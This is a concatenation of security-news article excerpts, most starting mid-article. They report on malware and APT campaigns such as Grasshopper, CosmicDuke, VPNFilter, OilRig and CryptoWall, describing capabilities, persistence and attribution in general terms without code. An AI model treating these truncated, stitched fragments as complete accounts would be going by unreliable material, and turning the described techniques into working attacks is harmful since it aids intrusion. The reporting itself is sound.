" }

The framework, dubbed “Grasshopper,” has been described as a tool that allows operators to build a custom installation executable, run that executable, and evaluate the results of the execution. The Grasshopper user guide specifies that the dropper should be loaded and executed only in memory. Leaked documents show that Grasshopper provides various persistence mechanisms and allows users to define a series of conditions that need to be met before an installation is launched. These rules can help determine if the targeted device is running the correct version of Windows and if certain security products are present. One of the persistence mechanisms highlighted by WikiLeaks involves the Windows Update Service, which can be abused to ensure that the payload is executed on every system boot or every 22 hours, when the service loads a series of DLLs specified in the registry. WikiLeaks also highlighted Stolen Goods, a Grasshopper persistence module that borrows code from the notorious Carberp banking Trojan, whose source code was leaked a few years ago. The authors of Stolen Goods, however, pointed out that only some parts of the Carberp code were taken and those were heavily modified. “The documents WikiLeaks publishes today provide an insights into the process of building modern espionage tools and insights into how the CIA maintains persistence over infected Microsoft Windows computers, providing directions for those seeking to defend their systems to identify any existing compromise,” WikiLeaks said. This is the third round of files made public by WikiLeaks as part of the dump called Vault 7. The organization claims to possess numerous exploits allegedly used by the CIA and it has offered to share them with affected tech companies, but it appears that many firms are not willing to comply with WikiLeaks’ demands to obtain the information. An analysis of the information made public to date has shown that many of the vulnerabilities have already been patched by security firms and tech giants such as Apple and Google. Cisco did admit finding a critical vulnerability affecting many of its switches following an analysis of the Vault 7 files. " }

CosmicDuke, a piece of malware designed for information theft, was discovered by the Finland-based security firm in April 2014 during the analysis of MiniDuke. Experts noticed at the time that the documents used as lure in the CosmicDuke attacks contained references to Ukraine, Turkey, Poland and Russia. Now, after analyzing some of the malicious documents uploaded to VirusTotal, researchers have determined that at least one Ministry of Foreign Affairs in Europe has been targeted by the threat actors. The documents, one of which references the EU sanctions against Russia over the crisis in Ukraine, trick users into enabling macros, which leads to the system getting infected with CosmicDuke. This variant of CosmicDuke is designed to install MiniDuke malware on infected systems. CosmicDuke was initially linked to MiniDuke because they used the same loader, which had only been seen in the MiniDuke group’s operations. The fact that CosmicDuke downloads MiniDuke onto infected devices represents further evidence of a connection between the threats, experts said. “CosmicDuke and MiniDuke complement each other. CosmicDuke is an infostealer - ideal for reconnaissance and data exfiltration. MiniDuke is a backdoor - it gives the attacker full control of the computer,” Timo Hirvonen, senior researcher at F-Secure, told SecurityWeek. CosmicDuke has been observed in two types of operations: ones targeting government and other high-profile organizations, and ones targeting users involved in the trafficking of controlled and illegal substances. Another piece of malware that has been used in two types of operations is OnionDuke, a threat discovered by F-Secure in November 2014. OnionDuke, which has been linked to MiniDuke through their command and control (C&C) infrastructure, has been used in attacks against government agencies, but also in mass infection operations aimed at Tor and torrent users. In advanced persistent threat (APT) campaigns, OnionDuke leverages a dedicated infrastructure that’s shared with MiniDuke. In these attacks, a complete version of the malware is utilized. On the other hand, in the mass infection campaigns, the C&C infrastructure is comprised of compromised servers and free hosting services, and the attackers have used a lighter version of OnionDuke, one that only downloads additional components onto infected machines, F-Secure noted. CosmicDuke, MiniDuke and OnionDuke are said to have Russian roots. Based on the evidence discovered so far, F-Secure researchers believe a Russian state agency is behind the campaigns. That’s because the high-profile organizations targeted in the attacks are in countries that present an interest to Russia. Furthermore, the CosmicDuke operations against users of illegal substances have been aimed at Russians, which indicates that the tool might be leveraged as legal spying software by the country’s law enforcement agencies. *Updated with additional details from F-Secure " }

Electrum is said to have used Crashoverride/Industroyer, a piece of malware designed to target industrial control systems (ICS), to cause the power outage in December 2016. Researchers have also found links to Sandworm (aka TeleBots and BlackEnergy), which has been blamed for the 2015 power outage that hit Ukraine. Sandworm is also believed to have played a role in the ongoing VPNFilter campaign. According to Dragos, Electrum initially focused on development and facilitating Sandworm attacks. However, starting with the Crashoverride attack, it took on operational tasks as well. The group is still active and starting with last year it has been seen focusing on organizations outside of Ukraine. While Dragos is unable to disclose which regions have been targeted, the company tells SecurityWeek that the hackers have launched attacks on organizations in the water and electric sectors. The security firm has been monitoring Electrum and earlier this year it came across new information on the threat actor’s infiltration techniques and capabilities of the Crashoverride malware. Researchers say the group relies on common attack methods rather than zero-day vulnerabilities and exploits. “For instance, the group used Microsoft SQL database servers as the gateway that bridges both the business and industrial control networks, to successfully compromise industrial control systems where they used stolen credentials to execute code,” explained Sergio Caltagirone, director of threat intelligence at Dragos.   Learn More at SecurityWeek's 2018 ICS Cyber Security Conference The company told SecurityWeek it had not identified any new deployment of the Crashoverride malware. “Crashoverride was a very specific framework for electric grid attacks. We would only expect to see this immediately prior to an ICS impact,” it said. “The group’s ongoing activity and link to the Sandworm team indicate Electrum’s sponsor could direct ICS disruption operations to other geographic areas,” Caltagirone noted. “Dragos considers Electrum to be one of the most competent and sophisticated threat actors currently in the ICS industry.” Dragos has published brief reports on several of the groups that pose a threat to ICS, including Iran-linked Chrysene, Russia-linked Allanite, and Xenotime, the group believed to be behind the Triton/Trisis attacks. Last week, it reported that a threat actor linked to North Korea’s Lazarus Group had stopped targeting organizations in the United States. " }

Independent security analyst Randy Abrams wanted to find his credit report on Equifax’s website when he was redirected to a website offering a fake Flash Player installer. The browsing session was taken through multiple domains before the final page was reached. It’s not uncommon for cybercriminals to deliver malware using fake Flash Player installers, but in this case the website pushed adware.  The Equifax webpage, hosted at aa.econsumer.equifax.com, did not redirect the connection when accessed by SecurityWeek on Thursday morning. Abrams believes Equifax removed the malicious code from its website sometime on Wednesday. An analysis of the domains involved in the redirection chain shows that they can lead not only to adware. The final destination depends on the type of device and the geographical location of the user. SecurityWeek has seen redirects to fake Android and iOS updates, premium SMS services, and other scammy sites. Various online security services detect the domains involved in the attack as malicious, and while there is no evidence of actual malware being served, the possibility cannot be ruled out. After visiting the compromised site several times from the same device, the user is taken to a website belonging to a legitimate business that is likely trying to promote its site via ad networks or SEO (search engine optimization) services. Contacted by SecurityWeek, an Equifax spokesperson stated, “We are aware of the situation identified on the equifax.com website in the credit report assistance link. Our IT and Security teams are looking into this matter, and out of an abundance of caution have temporarily taken this page offline. When it becomes available or we have more information to share, we will.” Equifax recently informed customers that hackers breached its systems after exploiting an Apache Struts 2 vulnerability that had been patched and exploited in the wild since March. The attackers gained access to the personal information of more than 140 million individuals, including hundreds of thousands of Canadian and British citizens. “I'm really not trying to kick Equifax while they are down. There are already 150 million other people doing that. I just sort of tripped over them,” Abrams said in a blog post. “I know that nobody is surprised at my find, but watching Equifax is getting to be like watching a video of United Airlines ‘deplaning’ a passenger... It hurts,” he added. Many of Equifax’s cybersecurity failings came to light following the breach, including the fact that the company directed customers to the wrong website and website vulnerabilities. UPDATE. After an investigation, Equifax determined that the problem was caused by a third-party vendor's code. The company has provided the following statement to SecurityWeek:  “Despite early media reports, Equifax can confirm that its systems were not compromised and that the reported issue did not affect our consumer online dispute portal.  The issue involves a third-party vendor that Equifax uses to collect website performance data, and that vendor’s code running on an Equifax website was serving malicious content. Since we learned of the issue, the vendor’s code was removed from the webpage and we have taken the webpage offline to conduct further analysis.” UPDATE 2. The same script also caused problems for another Big Three credit reporting agency, TransUnion. * Headline updated to remove the word \"hacked\" " }

The threat, believed to be a variant of the Tsunami botnet, has been analyzed in detail by researchers at Palo Alto Networks. The botnet targets embedded systems, particularly DVRs made by China-based TVT Digital, which are sold under more than 70 brands worldwide. The vulnerability exploited by the Amnesia malware was disclosed in March 2016 by researcher Rotem Kerner. The expert decided to make his findings public after the vendor ignored his attempts to report the flaw. The security hole likely remains unpatched and an Internet scan conducted by Palo Alto Networks shows that there are roughly 227,000 vulnerable DVRs in the United States, Taiwan, India, Israel, Turkey, Malaysia and many other countries. A different search carried out via the Censys.io project revealed more than 700,000 IP addresses. Amnesia has exploited the remote code execution flaw to identify vulnerable DVRs and take complete control of the devices. Several IoT botnets emerged over the past months, including the notorious Mirai and Remaiten, which also includes capabilities borrowed from Tsunami. What makes Amnesia interesting is the fact that it has virtual machine (VM) evasion capabilities – experts say this is the first Linux malware that attempts to evade sandboxes. It’s not uncommon for Windows and Android malware to evade VMs, but such evasion techniques have not been seen in Linux malware. “Amnesia tries to detect whether it’s running in a VirtualBox, VMware or QEMU based virtual machine, and if it detects those environments it will wipe the virtualized Linux system by deleting all the files in file system,” explained Palo Alto Networks researchers. “This affects not only Linux malware analysis sandboxes but also some QEMU based Linux servers on VPS or on public cloud.” While Amnesia has yet to be used for large-scale attacks, experts believe it does have the potential to become a major botnet that can cause significant damage.

PageFair helps web publishers measure and recover revenue lost due to ad blockers, which have become increasingly problematic for the advertising industry. The company says it serves more than 3,000 websites. Malicious actors penetrated the company’s systems after gaining access to a key email account via a spear phishing attack. Once they obtained access, the attackers hijacked PageFair’s account on the content delivery network MaxCDN and modified settings to replace the company’s legitimate analytics JavaScript tag with a piece of malware disguised as an Adobe Flash Player update. PageFair admitted that it had not activated two-factor authentication (2FA) on its MaxCDN account – the security feature was only activated after the incident was addressed. According to researchers at F-Secure, the threat was a remote administration tool (RAT) known as NanoCore. VirusTotal shows that major antiviruses detected the malware at the time of the attack, and users would have had to manually run the malicious files in order to get infected. PageFair said it detected the breach within minutes, but it took the company nearly an hour and a half to completely neutralize the attack. During this period, the malware made it to the websites of 501 publishers, 40 percent of which have more than one million page views per month. In an update provided on Monday evening, PageFair said just 2.3 percent of the affected websites’ visitors were at risk of getting infected. “There is no evidence or reason to believe that any core pagefair servers or databases were compromised. No publisher account information, passwords or personal information has been leaked,” Sean Blanchfield, CEO of PageFair, wrote in a post-mortem of the attack.

At the Chaos Communication Congress (31C3) that took place in Germany in late December, researcher Trammell Hudson demonstrated the capabilities of an experimental piece of malware that can be installed on the EFI (Extensible Firmware Interface) boot read-only memory (ROM) of Apple MacBooks through the Thunderbolt port. Dubbed \"Thunderstrike\" by the expert, the bootkit can be installed within minutes by an attacker who has physical access to the targeted device (i.e. an “evil maid” attack). The threat is also capable of copying itself to Thunderbolt devices connected to the initially infected machine, which enables it to easily spread to other computers. Thunderstrike doesn’t have a malicious payload, but the researcher says a weaponized version of the bootkit would be highly dangerous. First of all, it would be difficult to detect because there are no systems in place for identifying firmware rootkits on OS X. Furthermore, the malware is stealthy because it can hide by leveraging the system management mode (SMM). In addition to being difficult to detect, the bootkit is difficult to remove. Reinstalling OS X doesn’t help because the threat is independent of the operating system, and replacing the hard drive is useless because none of the malware’s components are stored on it. Attempts to replace the firmware by using regular methods are made ineffective by Thunderstrike since it changes the RSA public keys in the boot ROM. Hudson noted that firmware passwords do not prevent this type of attack. Once installed, the bootkit controls the system from the first instruction, which enables it to inject backdoors into the OS X kernel, log keystrokes, and perform other malicious tasks on behalf of its master. The experimental OS X firmware bootkit developed by Hudson has been successfully tested on MacBooks, but it also works on Mac Mini and iMac with Retina display devices. Hudson says he’s not aware of any such Mac OS X firmware bootkits in the wild. “Apple has a partial fix that they have started shipping in the new Mac Mini's and iMac Retinas, and they plan to release it for older Macs soon as a firmware update. Their fix is to not load Option ROMs during firmware updates, which is effective against the current proof-of-concept,” the expert said. “However... it is not a complete fix. Option ROMs are still loaded on normal boots, allowing snare's 2012 attack to continue working. Older Macs are subject to downgrade attacks by ’updating’ to a vulnerable firmware version,” he noted. Hudson is not the only one who presented firmware attacks at the 31C3 security conference. Researchers Rafal Wojtczuk and Corey Kallenberg disclosed several serious UEFI vulnerabilities affecting various vendors. Additional technical details on the Thunderstrike OS X firmware bootkit are available on Hudson’s blog. " }

The actively exploited vulnerability, tracked as CVE-2017-11826 and classified by Microsoft as “important,” is caused by a memory corruption issue. It allows a remote attacker to execute arbitrary code by getting the targeted user to open a specially crafted file. The zero-day affects all supported versions of Office. The weakness was reported to Microsoft by researchers at China-based security firm Qihoo 360. The experts said they first observed an attack exploiting this vulnerability on September 28. The attacks targeted a small number of the company’s customers and they involved malicious RTF files. Qihoo 360 has not provided too many details, but its analysis of the command and control (C&C) server used by the attackers showed that the operation was initiated in August and the first attacks were launched in September. Researchers said the hackers used phishing techniques to get the targeted users to open the malicious documents. The final payload was a Trojan designed to steal sensitive information from infected devices. Qihoo 360 said the attack also involved a DLL hijacking vulnerability in a “well-known” security product. The affected cybersecurity vendor has not been named, but DLL hijacking flaws have been found in the products of several companies, including Symantec, Kaspersky Lab, Rapid7, F-Secure and Comodo. Microsoft has also patched two vulnerabilities whose details were publicly disclosed before fixes were made available. This includes an XSS vulnerability in SharePoint (CVE-2017-11777), and a denial-of-service (DoS) issue in the Windows subsystem for Linux (CVE-2017-8703). A total of 27 flaws have been classified as critical, including a remote code execution vulnerability related to Windows DNSAPI (CVE-2017-11779). Microsoft also published an advisory to warn users of a security feature bypass affecting the firmware of Infineon Trusted Platform Modules (TPMs). The updates released by Microsoft last month patched roughly 80 vulnerabilities, including a .NET zero-day that had been exploited to deliver FinFisher malware to Russian-speaking individuals. Adobe has not released any Patch Tuesday updates. If no patches are released until the end of the month, it will be the first time since July 2012. " }

Cisco Talos’ initial report on VPNFilter said the threat targeted 16 routers and network-attached storage (NAS) devices from Linksys, MikroTik, Netgear, TP-Link and QNAP. It turns out that not only is the malware capable of hacking more device models from these vendors, it can also take control of products from ASUS, D-Link, Huawei, Ubiquiti, UPVEL, and ZTE. Talos now lists a total of more than 50 impacted devices. While researchers have identified a sample targeting UPVEL products, they have not been able to determine exactly which models are affected. Experts have also found a new stage 3 endpoint exploitation module that injects malicious content into traffic as it passes through a compromised network device. The new module, dubbed “ssler,” provides data exfiltration and JavaScript injection capabilities by intercepting traffic going to port 80. Attackers can control which websites are targeted and where the stolen data is stored. “With this new finding, we can confirm that the threat goes beyond what the actor could do on the network device itself, and extends the threat into the networks that a compromised network device supports,” Talos explained. Another new stage 3 module discovered after the initial analysis, dubbed “distr,” allows stage 2 modules to remove the malware from a device and then make that device unusable. One interesting capability of VPNFilter is to monitor the network for communications over the Modbus SCADA protocol. Talos has conducted further analysis of this sniffer and published additional details. When it was discovered, the VPNFilter botnet had ensnared roughly 500,000 devices across 54 countries. However, experts believe the main target is Ukraine and, along with U.S. authorities, attributed the threat to Russia, specifically the group known as Sofacy, with possible involvement of the actor tracked as Sandworm. The FBI has managed to disrupt the botnet by seizing one of its domains, but researchers noticed that the attackers have not given up and continue to target routers in Ukraine. " }

The firm calls the botnet 'Nemanja'. Composed of PoS terminals, accounting systems and grocery management platforms, the researchers said they discovered it earlier this year. \"The assigned name is related to potential roots of bad actors with similar nicknames from Serbia,\" according to a blog post by the firm. \"It included more than 1478 infected hosts from Argentina, Australia, Austria, Bangladesh, Belgium, Brazil, Canada, Chile, China, Czech Republic, Denmark, Estonia, France, Germany, Hong Kong, India, Indonesia, Israel, Italy, Japan, Mexico, Netherlands, New Zealand, Poland, Portugal, Russian Federation, South Africa, Spain, Switzerland, Taiwan, Turkey, UK, USA, Uruguay, Venezuela and Zambia.\" The compromised systems belong to small businesses and grocery stores, the firm explained.  \"Past incidents showed high attention from modern cybercriminality to retailers and small business segments having Point-of-Sale terminals,\" according to the company. \"We predict an increasing number of new data breaches in both sectors in the next few years, as well as the appearance of new types of specific malicious code targeted at retailers’ backoffice systems and cash registers. The nature of POS-related crimes can be different from country to country, but it shows the insecurity of modern payment environments. The bad actors combine several attack vectors in order to infect operators’ stations – “drive-by-download” and remote administration channels hacking.\" PoS attacks have grown in prevalence during the past few years. The biggest example of this would of course be the recent breach at Target, which company officials traced to an attack on PoS systems that lead to a breach that exposed information belonging to millions of customers. Earlier this month, a California man pleaded guilty to federal charges related to hacking point-of-sale systems in Subway restaurants. In a recent report, security firm Trustwave said they accounted for 33 percent of its breach investigations in 2013. \"The 33 percent of breaches being PoS is a percentage decrease over 2012, however we saw just as many actual cases of PoS breaches as we have in the past,\" said Karl Sigler, threat intelligence manager at Trustwave. \"This shows that while PoS breaches still trended upwards in 2013, attackers are diversifying and attacking more targets.\" \"The 'Nemanja' case has shown that cybercriminals started to join PoS malware with keyloggers in order to intercept credentials of various backoffice systems and databases in order to gain an access to payment or personal identifiable data,\" according to IntelCrawler. \"During the investigation on the 'Nemanja' botnet, over a thousand infected compromised PoS terminals, accounting systems, and grocery management systems were identified, which helped in collecting various fingerprints characterizing the victims.\" Foreseeing a future where PoS malware becomes a module of remote access Trojans and other malware, IntelCrawler believes card associations should expect a rise in PoS infections in developing countries in the near future due to poor security practices of many retailers in those regions.  " }

The attack works this way – the victim gets an email with a Microsoft Word or Excel document attached. The document includes a payload that downloads malware called 'Dridex', which is designed to target online banking information. The attacks lure the victims to open the attachment by using the names of legitimate companies located in the U.K. Some of the emails refer to an 'attached invoice' by stating it comes from a software company, online retailer or bank. Once the user opens the attachment, Dridex malware is installed. Users must enable macros in order for the malicious documents to work, and the some of the documents contain instructions on how to do just that.  Researchers at Microsoft recently reported a spike in threats using macros during the month of December.  Specifically, Microsoft spotted two macro downloaders spreading through spam email campaigns: TrojanDownloader: W97M/Adnel and TrojanDownloader:O97M/Tarbir. The threats appear to be targeting Microsoft customers predominantly in the US and UK. \"Using macros in Microsoft Office can help increase productivity by automating some processes,\" according to the Microsoft Malware Protection Center. \"However, malware authors have also exploited these capabilities. Since Microsoft set the default setting to \"Disable all macros with notification\", the number of macro-related malware threat has declined.

The spam emails are being spread using subject lines related to finances, such as 'ACH Transaction Report', 'Invoice as requested' and 'Payment Details'. Like Microsoft, Trustwave also detected a spike in macro-related threats late last year.

According to the security firm, Duuzer has mainly been used in targeted attacks aimed at the manufacturing industry in South Korea. The threat gives attackers remote access to the infected devices, allowing them to collect system information, access and modify files, upload and download files, and execute commands. Symantec discovered the malware, which it detects as Backdoor.Duuzer, on August 21, but based on the indicators of compromise (IoC) provided by the company, the threat appears to have been around since at least July 20. It’s currently unclear how the malware is being distributed, but experts believe the attackers are relying on spear phishing emails and watering hole attacks. The Trojan, designed to work on both 32-bit and 64-bit systems, checks for the presence of VMware and Virtualbox virtual machines to ensure that it’s not being analyzed by researchers before performing its malicious routines. Another method used to avoid detection involves renaming the malware after an existing legitimate piece of software that is configured to run on startup. “The attackers appear to be manually running commands through the back door on affected computers. In one case, we observed the attackers creating a camouflaged version of their malware, and in another, we saw them attempting to, but failing to deactivate Symantec Endpoint Protection (SEP),” Symantec said in a blog post. The threat actors behind Duuzer appear to be responsible for two other pieces of malware that have been making the rounds in South Korea. These threats, detected as W32.Brambul and Backdoor.Joanap, are used by the attackers to download additional payloads and conduct reconnaissance on infected machines. Brambul is a worm that spreads from one computer to another by relying on brute-force attacks aimed at the Server Message Block (SMB) protocol, which is normally used for providing shared access to files, printers, and serial ports. Brambul is designed to connect to random IP addresses and authenticate through SMB using common passwords, such as “password,” “login,” “123123,” “abc123” and “iloveyou.” Once it infects a device, the malware creates a network share to provide the attackers access to the system drive, after which it sends an email containing the computer’s details and login credentials to a preconfigured address. In some cases, the threat also downloads other malicious elements. Joanap, which is dropped alongside Brambul, opens a backdoor on the infected system, sends specific files to the attackers, downloads and executes files, and executes or terminates processes. According to Symantec, Duuzer is associated with both Joanap and Brambul. Experts discovered that Brambul-infected computers have also been infected with Duuzer, and used as command and control (C&C) servers for Duuzer.

Fidelis Cybersecurity published a report detailing the campaign on Thursday, just hours before a meeting between U.S. President Donald Trump and his Chinese counterpart, Xi Jinping. The company noticed in late February that the website of the National Foreign Trade Council (NFTC) had been hacked and set up to serve malware in what is known as a watering hole attack, or a strategic web compromise. Experts believe the attack ended by March 2, when links injected into the NFTC website had been removed. Evidence uncovered by investigators led them to believe that the attack was conducted by a China-linked cyber espionage group known as APT10, MenuPass and Stone Panda. Fidelis has dubbed the campaign Operation TradeSecret. According to researchers, the hackers set up certain web pages of the NFTC website to serve a reconnaissance framework known as Scanbox. The tool has been used for several years, including in attacks aimed at U.S. organizations and the Uyghur population in China. Scanbox has various plugins that allow attackers to collect information about the infected system and the software installed on it, and log keystrokes from the web browser. The harvested data can then be used to launch further attacks against the targeted individuals. In the case of the NFTC, whose board of directors includes some of the largest private sector companies in the United States, APT10 targeted only specific web pages. One of them was a registration page for a board of directors meeting, which suggests that people or organizations expected to attend the meeting had been targeted. “All organizations that have representatives on the board of directors of the NFTC -- or those who would have a reason to visit the site -- should investigate potentially impacted hosts using indicators provided in this report,” warned Fidelis. “Since the reconnaissance tool is typically used to enable future targeting campaigns, it should be assumed that targeted individuals will be subject to further attacks -- such as spearphishing campaigns.” The security firm said it notified the lobbying group of the breach. SecurityWeek has reached out to NFTC for comment and will update this article if the organization responds. Fidelis also reported seeing a similar campaign involving a fake website of Japan’s Ministry of Foreign Affairs. The APT10 attacks targeting Japan were also detailed in a report published this week by PwC UK and BAE Systems. The research conducted by the two companies focused on attacks launched by APT10 against managed service providers (MSPs) in at least fourteen countries. " }

The threat actor, known as OilRig, was recently spotted launching attacks against an organization within the government of the United Arab Emirates (UAE). When it first discovered the group’s activities back in May 2016, Palo Alto Networks believed the attacks had been carried out by a known group, but researchers later determined that the campaign was actually the work of a new actor, which is now tracked as OilRig. OilRig has been known to use a remote access trojan (RAT) named ISMDoor, which researchers also identified in attacks launched by another Iran-linked cyberspy group known as Greenbug. In attacks seen by Palo Alto Networks in July 2017, OilRig had started using a new piece of malware dubbed “ISMAgent,” which appeared to be a variant of the ISMDoor RAT. In even more recent attacks, observed by experts in August 2017, a new injector Trojan was used by the attackers. The new malware, tracked as “ISMInjector,” is a tool that has a sophisticated architecture and it includes anti-analysis techniques that were not previously leveraged by this group. “The complex structure and inclusion of new anti-analysis techniques may suggest that this group is increasing their development efforts in order to evade detection and gain higher efficacy in their attacks,” Palo Alto Networks researchers said in a blog post. In the attack aimed at the UAE government, hackers delivered their malware using malicious documents attached to emails with the subject line “Important Issue.” What made the emails interesting was the fact that they came from the targeted organization’s own domain. While experts initially believed that the attackers had spoofed the sender, they later determined that they actually used a compromised Outlook Web Access (OWA) account whose credentials they obtained in a previous phishing attack. The malicious documents sent to the UAE government, tracked by Palo Alto as “ThreeDollars,” delivered the new ISMInjector Trojan, which in turn dropped a variant of the ISMAgent backdoor by injecting it into a remote process it created. In order to make analysis of ISMInjector more difficult, the malware’s developers have relied on what researchers call “state machines” to create a new process and inject the payload into that process. Each state is responsible for conducting a particular action and it specifies the next state that should be executed. Since the states are not executed in sequential order, researchers analyzing the malware have to jump around in the code to determine how it works, which makes it more challenging to investigate the threat. Analysis of the malware is further complicated by the use of a crypter. Iran appears to have several cyber espionage groups, including APT33, Rocket Kitten, Cobalt Gypsy (Magic Hound), Charming Kitten (aka Newscaster and NewsBeef) and CopyKittens. " }

When Cisco Talos brought the existence of VPNFilter to light last month, the botnet had ensnared at least 500,000 routers and network-attached storage (NAS) devices across 54 countries. The malware can intercept data passing through the compromised device, it can monitor the network for communications over the Modbus SCADA protocol, and also has destructive capabilities that can be leveraged to make an infected device unusable. During the first stage of the infection process, once it completed initialization, the malware attempted to obtain an IP address from images hosted on the Photobucket service. If that failed, it would try to acquire the IP from an image hosted on a backup domain, toknowall.com. That IP pointed to a server hosting the stage 2 payload. Photobucket has closed the accounts used in the attack and the FBI has managed to take control of the toknowall.com domain, thus disrupting the operation. However, VPNFilter is designed to open a listener and wait for a specific trigger packet if the backup domain fails as well. This allows the attacker to still provide the IP for the stage 2 component. While it’s unclear exactly what else the FBI and cybersecurity firms did to disrupt the botnet, researchers at Jask and GreyNoise Intelligence noticed that VPNFilter has continued to target routers even after Talos published its report and the toknowall.com domain was seized. Experts have observed some IPs scanning port 2000 for vulnerable MikroTik routers located exclusively in Ukraine. The source IPs have been traced to countries such as Russia, Brazil, the United States, and Switzerland. “Activity like this raises some interesting questions about indications of ongoing Ukraine targeted campaigns, a likely subject for future research,” Jask wrote in a blog post. The VPNFilter attack was allegedly launched by Russia – specifically the group known as Sofacy, APT28, Pawn Storm, Fancy Bear, and Sednit – and the main target is believed to be Ukraine. Some links have also been found between the VPNFilter malware and BlackEnergy, which has been used by a different Russia-linked threat actor known as Sandworm. The FBI has viewed Sofacy and Sandworm as the same group when it attributed VPNFilter to Russia. The VPNFilter malware has been observed targeting devices from Linksys,  MikroTik,  Netgear, TP-Link and QNAP.  All of these vendors have published advisories to warn their customers about the threat. The FBI has advised users to reboot their routers to temporarily disrupt the malware. While rebooting a router is typically enough to remove a piece of malware, VPNFilter has a clever persistence mechanism that helps its stage 1 component survive a reboot of the device. " }

CryptoWall has been around since at least November 2013. The malware has been distributed through spam and malvertising campaigns. Exploits kits such as Flashpack, Angler, Infinity and RIG have been used to push the threat onto victims’ computers. In August 2014, the Dell SecureWorks Counter Threat Unit reported that CryptoWall had infected nearly 625,000 systems between mid-March and August 24, encrypting over 5 billion files. Researchers determined that the ransomware had helped its masters earn more than $1 million in the six-month period. The first samples of CryptoWall 2.0 were spotted by researchers in October. Experts noted at the time that the malware authors had started using the Tor anonymity network to protect command and control (C&C) traffic. According to Cisco, the CryptoWall 2.0 dropper relies on multiple exploits for initial access to a system. One of the samples analyzed by researchers exploited an old Windows vulnerability (CVE-2013-3660) to escalate its privileges. In order to ensure that it’s not executed in a sandbox environment, the ransomware incorporates anti-VM and anti-emulation checks that must be passed before the actual malware is installed on a system. Both the dropper and the binary it downloads are protected by several layers of encryption, Cisco said. Experts noted that CryptoWall 2.0 creates registry entries for persistence, and disables system protections and various services (Windows Update, ERSvc, Security Center, Windows Defender, Background Intelligent Transfer Service, Windows Error Reporting Service) on the infected device. An interesting aspect of CryptoWall 2.0 is that it can run 64-bit code directly from the 32-bit dropper. It does this by leveraging the WoW64 (Windows 32-bit on Windows 64-bit) subsystem to switch the processor execution context. “[The analyzed sample] includes some 64 bit code (and an exploit DLL) directly in its main 32-bit executable. Although the main module is running in 32-bit mode, it is capable of executing all the 64-bit functions it needs. It accomplishes this by performing a direct Processor execution context switch,” Cisco researchers explained in a blog post. CryptoWall has taken the place of CryptoLocker, the most notorious piece of ransomware before its infrastructure was disrupted by law enforcement authorities last summer as part of an operation targeting the Gameover Zeus malware. While the original CryptoLocker is out of the picture, cybercriminals still leverage its reputation. In mid-December, Barracuda Labs researchers reported spotting infections with a ransomware claiming to be CryptoLocker in Australia. " }

In September 2012, Google acquired VirusTotal, which lets users submit a file that may be suspect and scans it using the engines of dozens of antivirus products to see if the file in question has been marked as malicious by any of the vendors.  The VirusTotal Uploader tool enables security researchers to easily submit files to VirusTotal. The Windows version of the utility has been around for years and it has benefited from numerous improvements. Some members of the community have even developed alternatives, like PhrozenSoft.  Similar to the Windows variant, the OS X version of VirusTotal Uploader is easy to utilize and lets users simply drag and drop files, folders or applications in the Uploader window in order to scan them with more than 50 antivirus solutions. Files can also be scanned by right-clicking on them and selecting the app from the “Open With” menu.   The software has been tested on Mac OS X 10.8 and 10.9, and users who uncover bugs and those who have ideas for new features are advised to contact VirusTotal.  Apple’s popular operating system is being increasingly targeted by cybercriminals, resulting in security companies and researchers focusing more on analyzing threats aimed at the OS X platform.  “Hopefully this will lead to VirusTotal receiving more Mac applications, diving deeper into an increasingly targeted OS by attackers and allowing antivirus companies and researchers making use of VirusTotal's backend to build stronger defenses against these threats,” VirusTotal’s Karl Hiramoto noted in a blog post.

Last week at the Virus Bulletin conference in Prague, Symantec researcher Mario Ballano detailed a mysterious piece of malware that infected tens of thousands of routers, IP cameras and other devices apparently with the purpose of protecting them. Linux.Wifatch, which has been around since at least November 2014, uses Telnet and other protocols to hack into devices on which owners either set a weak password or left the default password unchanged. Once it infects a device, Wifatch scans it for known malware and disables Telnet to keep others out. While a threat like Wifatch can be used for a wide range of malicious activities, including distributed denial-of-service (DDoS) attacks and DNS poisoning, the fact that it wasn’t used for anything malicious has led experts to believe that its operators are “IoT vigilantes” whose goal is to secure vulnerable devices. This appears to be the case as a group calling itself “The White Team” has published the source code for Linux.Wifatch. Ballano has confirmed for SecurityWeek that the source code is genuine. The researcher says the developers of Wifatch contacted Symantec to let the company know about their intention to publish the source files. The developers of Wifatch claim to have created the malware to learn, to understand, for fun, and for users’ security. “Apart from the learning experience, this is a truly altruistic project, and no malicious actions are planned (and it nice touch that Symantec watch over this),” they wrote next to the source code files. The developers claim the project was never meant to be a secret, but they didn’t make its existence known earlier to avoid unwanted attention, particularly from malware authors. However, now that everyone knows about Wifatch, they have decided to release the source code under the GNU General Public License. The authors of Wifatch haven’t revealed their true identity and only noted that they are “nobody important.” They say they feel bad about abusing infected users’ resources, but they believe the benefits of their actions outweigh the potential negative impact. “The amount of saved bandwidth by taking down other scanning malware, the amount energy saved by killing illegal bitcoin miners, the number of reboots and service interruptions prevented by not overheating these devices, the number of credentials and money not stolen should all outweigh this. We co-opted your devices to help the general public (in a small way),” the developers said. The Wifatch botnet uses a peer-to-peer (P2P) architecture to prevent takeovers and all the commands sent to the bots are signed with a private ECDSA key. In order to prevent abuse, the source code that has been made available does not contain the private key, the infection code, and certain parts of the command and control code. Build scripts are also missing, but these and other components could be released at a later time. However, the White Team has warned that users should secure their routers against such attacks since the private key might get stolen or there could be a bug in the code that can be exploited to gain access. Symantec also revealed finding the following quote from software freedom activist Richard Stallman in the Wifatch source code: “To any NSA and FBI agents reading my email: please consider whether defending the US Constitution against all enemies, foreign or domestic, requires you to follow Snowden's example.” The White Team said it had initially used this quote in the Telnet message displayed on infected devices, but it was removed after a short period of time because the group found it “a bit silly.” Ballano told SecurityWeek that the Telnet message displayed on infected devices has been updated to clarify the project’s intentions and purpose. The researcher says that while the developers of Wifatch seem to have good intentions, Symantec will continue to monitor their activities. " }

